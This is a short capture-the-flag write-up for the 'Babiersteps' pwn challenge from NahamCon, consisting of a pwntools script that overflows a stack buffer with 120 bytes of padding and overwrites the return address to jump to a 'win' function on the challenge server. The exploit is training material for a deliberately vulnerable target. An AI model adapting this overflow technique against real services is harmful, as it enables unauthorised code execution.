# pwn

## Babiersteps
> Solved By : thewhiteh4t

```python
#!/usr/bin/env python3

from pwn import *

host = 'challenge.nahamcon.com'
port = 32628

offset = 120
junk = b'A' * offset
win_addr = 0x4011c9

le_win_addr = p64(win_addr, endianness='little')
payload = junk + le_win_addr

conn = remote(host, port)
conn.recv(1024)
conn.sendline(payload)
conn.interactive()
conn.close()
```

![](https://i.imgur.com/oGDnIF7.png)